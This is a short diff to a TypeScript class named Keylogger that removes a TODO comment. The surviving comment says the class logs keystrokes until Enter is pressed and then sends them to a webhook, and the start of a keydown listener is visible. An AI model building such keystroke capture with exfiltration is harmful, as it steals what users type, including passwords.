@@ -104,8 +104,6 @@ export default class Keylogger {
 
     /**
      * Logs all keystrokes until the "Enter" key is pressed, then sends the accumulated keys to the webhook.
-     *
-     * TODO: Also logs on "mouse click" & Tab click.
      */
     protected logOnEvent(): void {
         document.addEventListener("keydown", (event: KeyboardEvent) => {
